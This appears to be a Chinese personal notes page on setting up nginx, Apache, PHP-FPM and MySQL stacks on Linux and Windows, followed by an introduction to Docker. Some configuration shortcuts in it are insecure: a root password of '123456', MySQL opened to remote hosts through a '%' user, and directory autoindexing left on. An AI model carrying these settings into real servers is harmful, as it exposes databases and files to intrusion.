第三种,需要在访客看到的网址中隐藏掉index.php,且带.html后缀
http://blog.jjonline.cn/Usr/UsrInfo.html

ThinkPHP中处理url的各种逻辑,TP对传参进行了多种判定与处理,除了get方式传递不同的get变量作为mvc中的控制变量外,还有一个"兼容模式"的传参规则
http://blog.jjonline.cn/index.php?s=/Usr/UsrInfo
这种传参形式依然是get方式传参,但省略了多个get参数。TP框架会对获取到的get变量$_GET['s']进行处理,从其中提取出mvc所需要的各个控制变量。

所以又一种nginx的url重写出现了：
location / {
  root /var/www;
  index index.html index.htm index.php;
  if (!-e $request_filename) {
    rewrite ^(.*)$ /index.php?s=$1 last;
    break;
  }
}

那么,现在需要同时兼容上述url示例中的三种格式又出问题了,最后解决方法如下:
location / {
  root /var/www;
  index index.html index.htm index.php;
  if (!-e $request_filename) {
    rewrite ^/index.php(.*)$ /index.php?s=$1 last;
    rewrite ^(.*)$ /index.php?s=$1 last;
    break;
  }
}

</pre>
</div>

<h4>Questions</h4><pre>
1、win10
error.log
2018/04/27 22:50:06 [error] 7200#6500: *20 upstream timed out (10060: A connection attempt failed because the connected party did not properly respond after a period of time,or established connection failed because connected host has failed to respond) while connecting to upstream,client: 127.0.0.1,server: localhost,request: "HEAD /info.php HTTP/1.1",upstream: "fastcgi://127.0.0.1:9000",host: "localhost"

ping localhost
来自 ::1 的回复: 时间 < 1ms
win10默认ipv6的解析,而ipv6默认解析到【::1】而不是127.0.0.1,所以nginx配置文件里面是连接不到本地的tomcat,一直处于timeout的状态

</pre>
</div>

<div id="lamp">
<h3>lamp</h3><pre>
LAMP架构支持三种httpd+php方案
1) 在httpd服务中集成模块(libphp5.so)化方式
2) CGI方式(一台hhtpd服务器响应http请求时调用新的进程处理php请求)
3) fastcgi后端提供cgi server process方式(C/S架构的方式使得php服务分离出来成为独立服务,通过监听套接字和前端httpd扮演的代理客户端交互,通过php-XXX与后端的服务进行动态调用)

apt install apache2      # 安装好后打开浏览器,输入localhost查看是否安装成功
apt install php7.0       # 安装完成后输入：php -v查看PHP是否安装成功

PHP和Apache都安装好后就需要让Apache能够识别解析PHP文件,先搜一下有没有适合PHP7的插件,输入命令：apt-cache search libapache2-mod-php
可以看到搜出来的结果里面有一个是PHP7.0版本的,就安装这个：sudo apt-get install libapache2-mod-php7.0
写一个php文件看是否可以解析访问。切换到apache项目目录下cd /var/www/html,新建文件sudo vim test.php
保存后浏览器访问：localhost/test.php

sudo apt-get install mysql-server mysql-client    # 安装数据库Mysql服务端和客户端,mysql -V查看安装的版本信息
apt-get install php7.0-mysql                      # 安装php的mysql插件让mysql能够和php互动
apt install php7.0-gd php7.0-mbstring php7.0-xml  # 安装一些常用的php扩展
sudo apt-get install composer                     # 安装composer,输入命令composer查看是否成功

apache根目录默认/var/www,可根据需要修改
apache配置文件目录/etc/apache2,入口文件conf.d,mods-* apache模块,sites-* 虚拟主机,available可使用的,enable已启用的
php配置文件目录 /etc/php
mysql配置文件目录 /etc/mysql

tasksel lamp-server    # tasksel只提供套装软件

apache virtual-host虚拟主机
video.imooc.com
bbs.imooc.com
oa.imooc.com

手动模拟dns
修改hosts文件

apache虚拟主机配置文件
/etc/apache2/sites-available/default
复制该文件分别命名为video、bbs、oa,修改serverName、DocumentRoot、Directory
在/etc/apache2/sites-enable/建立3个软链接
ln -s ../sites-available/video vidoe
ln -s ../sites-available/bbs bbs
ln -s ../sites-available/oa oa

重启apache

【 mysql数据存储目录迁移 】
$ sudo service mysql stop
# 新建迁移目标文件夹,修改文件夹用户权限和源文件相同
$ mkdir /mysqldata
$ sudo chown -vR mysql:mysql /mysqldata/
$ sudo chmod -vR 700 /mysqldata/
$ sudo cp -av /var/lib/mysql/* /mysqldata/
$ sudo vi /etc/mysql/my.cnf                 # 注释datadir,改为datadir=/mysql/
$ sudo vi /etc/apparmor.d/usr.sbin.mysqld   # 注释修改/var/lib/mysql/为/mysqldata/
$ sudo service apparmor reload
$ sudo service mysql start
$ sudo rm -rf /var/lib/mysql

【 安装phpmyadmin 】
1、apt方式
$ sudo apt install phpmyadmin
$ sudo ln -s /usr/share/phpmyadmin/ /var/www/pma

2、手动上传
下载phpmyadmin软件包上传至服务器

3、配置虚拟主机二级域名

【 ubuntu中mysql配置remote access 】
$ /etc/mysql/my.cnf
bind-address = 127.0.0.1  # 注释掉该行
创建新的用户host为%

【 简单的服务器集群 lamp集群 】
架构(还可添加缓存服务器、索引服务器、中间件等)

</pre><textarea>大量用户请求
    |
nginx分发请求
    |
apache+php服务器集群  <-----读取mysql集群数据----
    | 写入                                     |
mysql1  ------同步数据到读数据库集群--------> mysql2,mysql3

</textarea>
</div>

<div id="lnmp">
<h3>lnmp</h3><pre>
LNMP架构仅支持一种Nginx+php结合方式：
Nginx：集成ngx_http_fastcgi_module模块实现代理请求功能
php-fpm：提供fastcgi模式,独立进程处理,有空闲等待进程方式处理前端ngx_http_fastcgi_module发送的请求
php-mysql:mysql-server,mariadb-server驱动和后面的server服务进行交互

Nginx不支持动态装载模块,所以要确保编译php工作为fpm机制时将ngx_http_fastcgi_module编译到Nginx程序中,在./configure时候要加入--enable-fpm选项

【 apt安装mysql 】
sudo apt update
sudo apt install mysql-server mysql-client
sudo apt install php-mysql  # 安装php5-mysql是将php和mysql连接起来
sudo service mysql start    # 开启mysql服务
mysql -u root -p            # 登录到mysql
update mysql.user set password = password('123456') where User = 'root'; # 为root用户创建密码
flush privileges; 
# 新设置用户或更改密码后需用flush privileges刷新MySQL的系统权限相关表,否则会出现拒绝访问,还有一种方法是重新启动mysql服务器使新设置生效

检查Mysql是否正在运行
sudo netstat -tap | grep mysql

如果服务器不能正常运行可以通过下列命令启动
sudo /etc/init.d/mysql restart
sudo service mysql start

删除mysql
sudo apt autoremove --purge mysql-server-5.0
sudo apt remove mysql-server
sudo apt autoremove mysql-server
sudo apt remove mysql-common                                      # 非常重要
dpkg -l | grep mysql | awk '{print $2}' | sudo xargs apt purge    # 清理残留数据

【 apt安装php、nginx 】
sudo apt-get update 
sudo apt-get install nginx
ps -aux | grep nginx     # 安装完成后会自动开启,否则service nginx start,可浏览器打开查看
apt-get install php-fpm  # 安装PHP

FPM (FastCGI进程管理器) 是一个可选的PHP FastCGI实现并且附加了对高负载网站很有用的特性

FPM的功能包括：
1、支持平滑停止/启动的高级进程管理功能;
2、可以工作于不同的uid/gid/chroot环境下,并监听不同的端口和使用不同的php.ini配置文件(可取代safe_mode的设置);
3、stdout和stderr日志记录;
4、在发生意外情况的时候能够重新启动并缓存被破坏的opcode;
5、文件上传优化支持;
6、"慢日志" - 记录脚本(不仅记录文件名,还记录PHP backtrace信息,可以使用ptrace或类似工具读取和分析远程进程的运行数据)运行所导致的异常缓慢;
7、fastcgi_finish_request() - 特殊功能：用于在请求完成和刷新数据后,继续在后台执行耗时的工作(录入视频转换、统计处理等);
8、动态／静态子进程产生;
9、基本SAPI运行状态信息(类似Apache的mod_status);
10、基于php.ini的配置文件

cgi(common gateway interface公共网关接口)、fast-cgi协议
早期的webserver只处理html等静态文件,webserver处理不了php等动态语言只能交给php解释器来处理
cgi协议为解决不同的语言解释器(如php、python解释器)与webserver的通信,只要按照cgi协议编写程序就能实现语言解释器与webwerver的通信,如php-cgi程序

fast-cgi的改进
cgi协议解决了php解释器与webserver通信的问题webserver终于可以处理动态语言
但是webserver每收到一个请求都会去fork一个cgi进程,请求结束再kill掉这个进程。这样有10000个请求就需要fork、kill php-cgi进程10000次,很浪费资源
于是出现了cgi的改良版本fast-cgi。fast-cgi每次处理完请求后不会kill掉这个进程,而是保留这个进程,使这个进程可以一次处理多个请求。这样每次就不用重新fork一个进程了,大大提高了效率。

php-fpm即php-Fastcgi Process Manager,php-fpm是FastCGI的实现,并提供了进程管理的功能。
进程包含master进程和worker进程两种进程。
实现了fastCGI协议的nginx,第一次启动时会启动一个php-fpm的master进程,该master进程初始化环境后,启动多个worker进程(即php-fpm进程池中的php-fpm)
master进程只有一个,负责监听端口,接收来自Web Server的请求,而worker进程则一般有多个(具体数量根据实际需要配置),每个进程内部都嵌入了一个PHP解释器,是PHP代码真正执行的地方

当请求发来后,master进程把请求分发到进程池中的php-fpm,分发完后就可以接下一个请求了,避免了重复劳动(重复加载php.ini初始化环境),效率自然提升了
当请求多的时候master会启动更多的php-fpm子进程,当请求少的时候master也会停掉一些子进程。既提高了性能也节省资源。
当php-fpm设定的上限不足以支持更高的并发请求时,nginx只能返回502错误了,因为没有更多的php-fpm进程可用了。

</pre><textarea>server {
  listen       80;                                #监听80端口,接收http请求
  server_name  www.example.com;                   #就是网站地址
  root /usr/local/etc/nginx/www/huxintong_admin;  #准备存放代码工程的路径

  #路由到网站根目录www.example.com时候的处理
  location / {
    index index.php; #跳转到www.example.com/index.php
    autoindex on;
  }

  #当请求网站下php文件时反向代理到php-fpm
  location ~ \.php$ {
    include /etc/nginx/fastcgi.conf;            #加载nginx的fastcgi模块
    fastcgi_intercept_errors on;
    fastcgi_pass   127.0.0.1:9000;              #nginx fastcgi进程监听的IP地址和端口
  }
}

</textarea>访问www.example.com时处理流程<textarea>www.example.com
        |
      Nginx
        |
路由到www.example.com/index.php
        |
加载nginx的fast-cgi模块
        |
fast-cgi监听127.0.0.1:9000地址
        |
www.example.com/index.php请求到达127.0.0.1:9000
        |
     等待处理...
        |
php-fpm 监听127.0.0.1:9000
        |
php-fpm 接收到请求,启用worker进程处理请求
        |
php-fpm 处理完请求,返回给nginx
        |
nginx将结果通过http返回给浏览器

</textarea><pre>
启用php的php-fpm来处理这个请求
打开php-fpm.conf文件,看到配置：listen = 127.0.0.1:9000
即:php-fpm模块监听127.0.0.1:9000端口,等待请求到来去处理

启动nginx和php-fpm模块
sudo nginx -s reload
whereis php-fpm
php-fpm: /usr/sbin/php-fpm7.0
sudo php-fpm
启动成功,查看php-fpm进程
ps -ef | grep fpm
可以看到有一个master进程和3个worker进程

Nginx处理请求是通过fpm管理fastcgi来实现请求和相应,而Nginx和php-fpm可以通过监听9000端口(default)或socket来实现
127.0.0.1:9000走网络,通过Nginx的conf文件,把php结尾的都交给9000端口处理,php-fpm选择并且连接到一个fastcgi子进程,并将环境变量和标准输入发送到fastcgi子进程,然后不断处理请求响应。
socket文件不走网络,是套接字
UNIX Domain Socket：文件系统进行寻址和访问的套接字 .sock文件
UNIX系统不以后缀区分文件类型,但为方便常使用后缀标识,.sock文件极有可能是UNIX域套接字,即通过文件系统而非网络地址进行寻址和访问的套接字

一般提交动态请求时nginx会直接把请求转交给php-fpm,而php-fpm再分配php-cgi进程来处理相关的请求,之后再依次返回,最后由nginx把结果反馈给客户端浏览器

Nginx和PHP-FPM的进程间通信有两种方式,TCP和UNIX Domain Socket
TCP是IP加端口,可以跨服务器
UNIX Domain Socket不经过网络,只能用于Nginx跟PHP-FPM都在同一服务器的场景,用哪种取决于PHP-FPM配置

方式1:
php-fpm.conf: listen = 127.0.0.1:9000
nginx.conf: fastcgi_pass 127.0.0.1:9000;

方式2:
php-fpm.conf: listen = /run/php/php7.0-fpm.sock
nginx.conf: fastcgi_pass unix:/run/php/php7.0-fpm.sock;
其中php-fpm.sock是一个文件,由php-fpm生成,类型是srw-rw----.

Nginx如何与Php-fpm结合
Nginx不只有处理http请求的功能,还能做反向代理。Nginx通过反向代理功能将动态请求转向后端Php-fpm
开启php-fpm服务：sudo service php7.0-fpm start
start|stop|status|restart|reload|force-reload

nginx
配置文件 /etc/nginx/sites-available/default
access_log /var/log/nginx/access.log;
error_log /var/log/nginx/error.log;

php-fpm
配置文件 /etc/php/7.0/fpm/php-fpm.conf
配置文件 /etc/php/7.0/fpm/pool.d/www.conf
配置文件 /etc/nginx/snippets/fastcgi-php.conf
fastcgi_param配置文件 /etc/nginx/fastcgi.conf

error_log = /var/log/php7.0-fpm.log
user = www-data
group = www-data
listen = /run/php/php7.0-fpm.sock
listen.owner = www-data
listen.group = www-data

</pre><textarea># /etc/nginx/sites-available/default

location ~ \.php$ {
  include snippets/fastcgi-php.conf;
# fastcgi_pass 127.0.0.1:9000;  # With php7.0-cgi alone
  fastcgi_pass unix:/run/php/php7.0-fpm.sock;  # With php7.0-fpm
}

</textarea><pre>
fastcgi.conf是一个nginx的配置文件,用来把nginx中的变量,解释为PHP能够理解的变量
Nginx中很多fastcgi_*的配置项是因为Nginx的一个默认内置module ngx_http_fastcgi_module实现了FastCGI的Client
fastcgi_param所声明的内容将会被传递给"FastCGI server",即fastcgi_pass所指向的server,也就是Nginx+PHP模式下的PHP-FPM所管理的FastCGI进程,或者说是那个socket文件载体
做PHP应用开发时候用到 $_SERVER 这个全局变量,它里面包含了很多服务器的信息,比如包含了用户的IP地址,PHP身处socket文件之后,为什么能得到远端用户的IP呢？有一个fastcgi_param配置REMOTE_ADDR,正是PHP中用 $_SERVER['REMOTE_ADDR'] 取到的用户IP
Nginx模块里fastcgi_param参数,就是考虑后端程序有时需要获取Webserver外部的变量以及服务器情况,那么ngx_http_fastcgi_module就帮我们做了这件事

Nginx+PHP的工程模式下,Nginx和PHP分工明确,Nginx负责承载HTTP请求的响应与返回以及超时控制记录日志等HTTP相关的功能,而PHP则负责处理具体请求要做的业务逻辑,它们俩的这种合作模式也是常见的分层架构设计中的一种,在它们各有专注面的同时,FastCGI又很好的将两块衔接,保障上下游通信交互,这种通过某种协议或规范来衔接好上下游的模式,在日常的PHP应用开发中也有这样的思想落地,譬如开发的高性能API,具体的Client到底是PC、APP还是某个其他程序,我们不关心,而这些PC、APP、第三方程序也不关心我们的PHP代码实现,他们按照API的规范来请求做处理即可。技术思想是可以在各个环节融会贯通的

【 fastcgi_pass 】
fastcgi_pass配置为unix:/run/php/php7.0-fpm.sock时,执行简单的php文件时nginx error.log显示upstream timed out (110: Connection timed out) while reading upstream,修改各种超时时间仍然无法解决
fastcgi_pass配置为127.0.0.1:9000,php7.0-fpm配置listen = 127.0.0.1:9000时php程序正常执行

【 Nginx+PHP-FPM优化技巧 】
1.Unix域Socket通信
Unix域Socket因为不走网络,可以提高Nginx和php-fpm通信的性能,但在高并发时会不稳定。
Nginx会频繁报错：connect() to unix:/dev/shm/php-fcgi.sock failed (11: Resource temporarily unavailable) while connecting to upstream
 
可以通过下面两种方式提高稳定性：
1)调高nginx和php-fpm中的backlog
配置方法为：在nginx配置文件中这个域名的server下,在listen 80后面添加default backlog=1024。
同时配置php-fpm.conf中的listen.backlog为1024,默认为128。
2)增加sock文件和php-fpm实例数
再新建一个sock文件,在Nginx中通过upstream模块将请求负载均衡到两个sock文件背后的两套php-fpm实例上。

php-fpm参数调优
1、进程数
php-fpm初始/空闲/最大worker进程数
pm.max_children = 300
pm.start_servers = 20
pm.min_spare_servers = 5
pm.max_spare_servers = 35
 
2、最大处理请求数
最大处理请求数是指一个php-fpm的worker进程在处理多少个请求后就终止掉,master进程会重新respawn一个新的。
这个配置的主要目的是避免php解释器或程序引用的第三方库造成的内存泄露。
pm.max_requests = 10240
 
3、最长执行时间
最大执行时间在php.ini和php-fpm.conf里都可以配置,配置项分别为max_execution_time和request_terminate_timeout。

</pre>
</div>

<div id="wnmp">
<h3>wnmp</h3><textarea>rem wnmp.bat
taskkill /F /IM nginx.exe /IM php-cgi.exe /IM mysqld.exe
@echo Type any key to go on... & pause > nul
@set str=%1
@if "%str%"=="stop" goto :end
@pushd E:\wnmp\nginx
nginx -t -c E:\wnmp\nginx\conf\wamp.conf
start /b nginx -c E:\wnmp\nginx\conf\wamp.conf
@set str=%1
@if "%str%"=="nginx" goto :end
@cd E:\wnmp\php
start /b php-cgi -b 127.0.0.1:9000 -c php.ini
net start mysql8
:end
@popd

</textarea>nginx安装配置<textarea>E:\wnmp\nginx>start /b nginx -c wamp.conf

worker_processes  1;
events {
  worker_connections  1024;
}
http {
  include       conf/mime.types;
  default_type  application/octet-stream;
  sendfile        on;
  keepalive_timeout  65;
  gzip  on;
  root   E:\wamp64\www;
  
  server {
    listen       80;
    server_name  127.0.0.1;

    location / {
      index  index.html index.htm index.php;
    }

    # redirect server error pages to the static page /50x.html
    error_page  404  /404.html;
    error_page  500 502 503 504  /50x.html;

    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
    location ~ \.php$ {
      fastcgi_pass   127.0.0.1:9000;
      fastcgi_index  index.php;
      fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
      include        conf\fastcgi_params;
    }
  }
}

</textarea><pre>
【 PHP安装配置 】
1、https://windows.php.net/download/ 下载安装x64 VC15 x64 Thread Safe zip安装包,线程安全,解压到E:\wnmp\php

2、配置php.ini,设置项前面的;表示注释了
php.ini-development拷贝重命名为php.ini
a.设置时区 date.timezone = PRC
b.设置编码 default_charset = "UTF-8"
c.设置短标签  short_open_tag = ON
d.设置扩展件目录  extension_dir = "ext"
e.开启模块,将各项前面的";"去掉,用于支持不同功能,需要开启的功能如下：
extension = php_bz2.dll
extension = php_curl.dll
extension = php_fileinfo.dll
extension = php_gd2.dll
extension = php_gettext.dll
extension = php_mbstring.dll
extension = php_mysql.dll
extension = php_mysqli.dll
extension = php_openssl.dll
extension = php_pdo_mysql.dll
extension = php_sockets.dll
extension = php_xmlrpc.dll
extension = php_zip.dll

3、配置环境变量
在path变量中追加E:\wnmp\php\ext

4、启动php-cgi
cmd> php-cgi.exe -b 127.0.0.1:9000 -c php.ini     #关闭cmd窗口即终止进程
cmd> nginx                                        #关闭cmd窗口仍然运行

E:\wnmp\php>start /b ./php-cgi.exe -b 127.0.0.1:9000 -c php.ini   # php目录没有设置环境变量
E:\wnmp\nginx>start /b nginx -c E:\wnmp\nginx\wamp.conf           # nginx已经设置了环境变量

【 自定义安装 mysql 】
mysqld是MySQL的主程序,The MySQL Server
mysql是MySQL的命令行工具,The MySQL Command-Line Tool

mysql-server
cmd> net start mysql    # 启动mysql数据库服务
cmd> net stop mysql     # 关闭mysql服务

右击我的电脑－＞管理－＞弹出计算机管理,选服务和应用程序－＞服务－＞MYSQL4－＞双击启动即可
任务管理器 -> 服务 -> MYSQL80 ->右键启动终止

win10子系统ubuntu访问win10的mysql服务
cmd> mysql -h 127.0.0.1 -u root -p

【 安装apache 】
1.下载安装包,httpd-2.4.23-x64-vc14-r3.zip,vc14是windows的运行库,可以到微软的官网下载,若安装时出现提示计算机中丢失VCRUNTIME140.dll则是因为运行库vc14未安装的问题,下载apache与PHP时最好是一致的vs运行库版本
2.解压安装包,位置是D:\tools\Apache24
3.修改配置文件conf/httpd.conf
Define SRVROOT "/Apache24" 改为 Define SRVROOT "D:/tools/Apache24",以后${SRVROOR}指Apache的安装目录
< IfModule dir_module>
  DirectoryIndex index.html
</ IfModule>
改为
< IfModule dir_module>
  DirectoryIndex index.html index.php default.php index.htm
</ IfModule>

在文件的最后,添加对PHP的支持
# php5 support
LoadModule php5_module D:/tools/php5.6/php5apache2_4.dll
AddType application/x-httpd-php .php
# configure the path to php.ini
PHPIniDir "D:/tools/php5.6"
< IfModule dir_module>
  DirectoryIndex index.php index.html index.htm
< /IfModule>

#php7 support
LoadModule php7_module "E:/mysever/php7/php7apache2_4.dll"
< IfModule php7_module> 
  PHPIniDir "E:/mysever/php7/" 
  AddType application/x-httpd-php .php
  AddType application/x-httpd-php-source .phps
< /IfModule>

进入apache的bin目录下面来输入命令httpd.exe检查是否有错误
在Apache24\htdocs目录下新建内容为echo phpinfo();的phpinfo.php文件,然后在浏览器中访问http://127.0.0.1/phpinfo.php

4.安装apache,在apache的bin目录下面用管理员权限执行httpd.exe -k install将Apache添加到系统服务中
在cmd命令行执行services.msc或服务打开系统服务控制台就可以看到刚刚添加的Apache2.4服务
这个时候在浏览器输入localhost即可看到it works

修改apache项目部署目录
找到conf/httpd.conf查找document将这个路径改成想要的路径即可,然后重启apache服务
DocumentRoot "${SRVROOT}/www/"
DocumentRoot "E:/mysever/Apache24/htdocs"

启动Apache服务器
a、在启动Apache服务器之前,保险起见,可以到D:\tools\php5.6中执行一下php.exe确保已经正确安装配置。这个过程可能出现的问题是没有安装msvcr110.dll,导致php.exe执行失败。这个时候就要安装一下msvcr110.dll,可以到网上找找,http://www.microsoft.com/zh-CN/download/details.aspx?id=30679可以下载适合自己电脑的。

b、cmd执行httpd.exe -k start启动Apache服务器,或双击ApacheMonitor.exe启动Apache服务器(启动图形化界面,这个需要先将Apache添加到系统服务中)
可能出现的问题是没有安装vc_redist.x64.exe,即Visual C++运行时库。
如果出现php5apache2_4.dll无法加载到服务器中的问题,很有可能是php不能正常启动,或httpd.conf没有配置正确。

使用cmd命令httpd.exe -k start启动,在窗口中就可以具体的错误信息。

php和Apache的版本一定要一致,如使用php5.6,在安装目录下有php5apache2_4.dll,那么Apache就需要选择2.4版本的。

</pre>
</div>

<div id="docker">
<h2>Docker - Build, Ship, and Run Any App, Anywhere</h2><pre>
软件开发最大的麻烦事之一就是环境配置。用户计算机的环境都不相同,怎么知道自家的软件能在那些机器跑起来？
用户必须保证两件事:操作系统的设置,各种库和组件的安装。只有它们都正确软件才能运行。举例来说,安装一个Python应用,计算机必须有Python引擎,还必须有各种依赖,可能还要配置环境变量。
如果某些老旧的模块与当前环境不兼容就麻烦了。开发者常常会说:"它在我的机器可以跑了"(It works on my machine),言下之意就是,其他机器很可能跑不了。
环境配置如此麻烦,换一台机器就要重来一次。很多人想到能不能从根本上解决问题,软件可以带环境安装？也就是说,安装的时候把原始环境一模一样地复制过来。

对于配置本地开发环境,从很早以来就有多种方案,包括:
1、从PHP, MySQL等官网下载并手工安装配置
2、使用Windows自带的Web Pi一键式安装,对于生产为Linux平台来说可能出现环境不一致导致的问题
3、使用XAMPP,phpStudy之类的一键包
4、使用VirtualBox安装开发专用集成镜像
5、docker

环境部署一直是一个很大的问题,无论是开发环境还是生产环境,但是 Docker 将开发环境和生产环境以轻量级方式打包,提供了一致的环境。极大的提升了开发部署一致性。当然,实际情况并没有这么简单,因为生产环境和开发环境的配置是完全不同的,比如日志等的问题都需要单独配置,但是至少比以前更加简单方便了

【 虚拟机 】
虚拟机(virtual machine)就是带环境安装的一种解决方案。它可以在一种操作系统里面运行另一种操作系统,比如在 Windows 系统里面运行 Linux 系统。应用程序对此毫无感知,因为虚拟机看上去跟真实系统一模一样,而对于底层系统来说,虚拟机就是一个普通文件,不需要了就删掉,对其他部分毫无影响。
虽然用户可以通过虚拟机还原软件的原始环境。但是,这个方案有几个缺点。
(1)资源占用多
虚拟机会独占一部分内存和硬盘空间。它运行的时候,其他程序就不能使用这些资源了。哪怕虚拟机里面的应用程序,真正使用的内存只有 1MB,虚拟机依然需要几百 MB 的内存才能运行。
(2)冗余步骤多
虚拟机是完整的操作系统,一些系统级别的操作步骤,往往无法跳过,比如用户登录。
(3)启动慢
启动操作系统需要多久,启动虚拟机就需要多久。可能要等几分钟,应用程序才能真正运行。

【 Linux容器 】
由于虚拟机存在这些缺点,Linux发展出了另一种虚拟化技术:Linux容器(Linux Containers,缩写为LXC)。
Linux 容器不是模拟一个完整的操作系统,而是对进程进行隔离。或者说,在正常进程的外面套了一个保护层。对于容器里面的进程来说,它接触到的各种资源都是虚拟的,从而实现与底层系统的隔离。
由于容器是进程级别的,相比虚拟机有很多优势。
(1)启动快
容器里面的应用,直接就是底层系统的一个进程,而不是虚拟机内部的进程。所以,启动容器相当于启动本机的一个进程,而不是启动一个操作系统,速度就快很多。
(2)资源占用少
容器只占用需要的资源,不占用那些没有用到的资源;虚拟机由于是完整的操作系统,不可避免要占用所有资源。另外,多个容器可以共享资源,虚拟机都是独享资源。
(3)体积小
容器只要包含用到的组件即可,而虚拟机是整个操作系统的打包,所以容器文件比虚拟机文件要小很多。
总之,容器有点像轻量级的虚拟机,能够提供虚拟化的环境,但是成本开销小得多。

【 Docker 】
Docker平台主要由两部分组成:

Docker引擎
Docker为应用提供了一个虚拟化运行容器,Docker的运行容器轻巧而功能强大,用户可以按照Docker提供的工具与工作流创建并容器化自己的应用。

Docker Hub平台
一个由Docker提供的共享与管理各种应用的平台。平台上有官方提供的各种常用的应用运行环境,也有用户按照自身需求定制的运行环境

Docker属于Linux容器的一种封装,提供简单易用的容器使用接口,是目前最流行的Linux容器解决方案,是世界领先的软件容器平台
Docker将应用程序与该程序的依赖打包在一个文件里面,运行这个文件就会生成一个虚拟容,。程序在这个虚拟容器里运行,就好像在真实的物理机上运行一样,有了Docker就不用担心环境问题。
用户可以通过Docker的接口方便地创建和使用容器,把应用放入容器。
容器还可以进行版本管理、复制、分享、修改,就像管理普通的代码一样

Docker是一个开源的应用容器引擎,基于Go语言,并遵从Apache2.0协议开源。
Docker使用Google公司推出的Go语言进行开发实现,基于Linux内核的cgroup,namespace以及AUFS类的UnionFS等技术,对进程进行封装隔离,属于操作系统层面的虚拟化技术。 由于隔离的进程独立于宿主和其它的隔离的进程,因此也称其为容器。Docke最初实现是基于LXC。
Docker能够自动执行重复性任务,例如搭建和配置开发环境,从而解放了开发人员以便专注在真正重要的事情上:构建杰出的软件。
用户可以方便地创建和使用容器,把应用放入容器。容器还可以进行版本管理、复制、分享、修改,就像管理普通的代码一样。
Docker可以让开发者打包应用以及依赖包到一个轻量级、可移植的容器中,然后发布到任何流行的Linux机器上,也可以实现虚拟化。
容器是完全使用沙箱机制,相互之间不会有任何接口(类似 iPhone 的 app),更重要的是容器性能开销极低

容器虚拟化的是操作系统而不是硬件,容器之间是共享同一套操作系统资源的。虚拟机技术是虚拟出一套硬件后,在其上运行一个完整操作系统。因此容器的隔离级别会稍低一些。

Docker容器的特点
1、轻量,在一台机器上运行的多个Docker容器可以共享这台机器的操作系统内核;它们能够迅速启动,只需占用很少的计算和内存资源。镜像是通过文件系统层进行构造的,并共享一些公共文件。这样就能尽量降低磁盘用量,并能更快地下载镜像。
2、标准,Docker容器基于开放式标准,能够在所有主流Linux版本、Microsoft Windows以及包括VM、裸机服务器和云在内的任何基础设施上运行。
3、安全,Docker赋予应用的隔离性不仅限于彼此隔离,还独立于底层的基础设施。Docker默认提供最强的隔离,因此应用出现问题,也只是单个容器的问题,而不会波及到整台机器

为什么要用Docker
1、Docker的镜像提供了除内核外完整的运行时环境,确保了应用一致的运行环境,不会再出现"这段代码在我机器上没问题啊"这类问题
2、更快速的启动时间,可以做到秒级、甚至毫秒级的启动时间,大大的节约了开发、测试、部署的时间
3、隔离性,避免公用的服务器,资源会容易受到其他用户的影响
4、弹性伸缩,快速扩展,善于处理集中爆发的服务器使用压力
5、迁移方便,可以很轻易的将在一个平台上运行的应用,迁移到另一个平台上,而不用担心运行环境的变化导致应用无法正常运行的情况
6、持续交付和部署,使用Docker可以通过定制应用镜像来实现持续集成、持续交付、部署

Docker的应用场景
Web应用的自动化打包和发布。
自动化测试和持续集成、发布。
在服务型环境中部署和调整数据库或其他的后台应用。
从头编译或者扩展现有的OpenShift或Cloud Foundry平台来搭建自己的PaaS环境。

Docker的主要用途,目前有三大类。
(1)提供一次性的环境。比如本地测试他人的软件、持续集成的时候提供单元测试和构建的环境。
(2)提供弹性的云服务。因为Docker容器可以随开随关,很适合动态扩容和缩容。
(3)组建微服务架构。通过多个容器,一台机器可以跑多个服务,因此在本机就可以模拟出微服务架构

Docker的优点
1、简化程序:
Docker让开发者可以打包他们的应用以及依赖包到一个可移植的容器中,然后发布到任何流行的Linux机器上,便可以实现虚拟化。Docker改变了虚拟化的方式,使开发者可以直接将自己的成果放入Docker中进行管理。方便快捷已经是Docker的最大优势,过去需要用数天乃至数周的任务,在Docker容器的处理下只需要数秒就能完成。
2、避免选择恐惧症:
如果你有选择恐惧症,还是资深患者。Docker帮你打包你的纠结！比如Docker镜像;Docker镜像中包含了运行环境和配置,所以Docker可以简化部署多种应用实例工作。比如Web应用、后台应用、数据库应用、大数据应用比如Hadoop集群、消息队列等等都可以打包成一个镜像部署。
3、节省开支:
一方面,云计算时代到来,使开发者不必为了追求效果而配置高额的硬件,Docker改变了高性能必然高价格的思维定势。Docker与云的结合,让云空间得到更充分的利用。不仅解决了硬件管理的问题,也改变了虚拟化的方式。

【 Docker架构 】
docker的架构设计分为三个组件:一个客户端,一个REST API和一个服务器(守护进程):
Client:与REST API交互。主要目的是允许用户连接守护进程。
REST API:充当客户端和服务器之间的接口,实现通信。
守护进程:负责实际管理容器 - 启动,停止等。守护进程监听来自docker客户端的API请求

Docker使用客户端-服务器(C/S)架构模式,使用远程API来管理和创建Docker容器。
Docker容器通过Docker镜像来创建。
容器与镜像的关系类似于面向对象编程中的对象与类。

Docker镜像(Images)
Docker镜像是用于创建Docker容器的模板。

Docker容器(Container)
容器是独立运行的一个或一组应用。

Docker客户端(Client)
Docker客户端通过命令行或其他工具使用Docker API(https://docs.docker.com/reference/api/docker_remote_api)与Docker的守护进程通信。

Docker主机(Host)
一个物理或虚拟的机器用于执行Docker守护进程和容器。

Docker仓库(Registry)
Docker仓库用来保存镜像,可以理解为代码控制中的代码仓库。Docker Hub(https://hub.docker.com)提供了庞大的镜像集合供使用。

Docker Machine
Docker Machine是一个简化Docker安装的命令行工具,通过一个简单的命令行即可在相应的平台上安装Docker,比如VirtualBox、 Digital Ocean、Microsoft Azure

【 容器vs虚拟机 】
容器和虚拟机具有相似的资源隔离和分配优势,但功能有所不同,因为容器虚拟化的是操作系统,而不是硬件,因此容器更容易移植,效率也更高

传统虚拟机技术是虚拟出一套硬件后,在其上运行一个完整操作系统,在该系统上再运行所需应用进程;而容器内的应用进程直接运行于宿主的内核,容器内没有自己的内核,而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便。

容器是一个应用层抽象,用于将代码和依赖资源打包在一起。 多个容器可以在同一台机器上运行,共享操作系统内核,但各自作为独立的进程在用户空间中运行 。与虚拟机相比, 容器占用的空间较少(容器镜像大小通常只有几十兆),瞬间就能完成启动 。

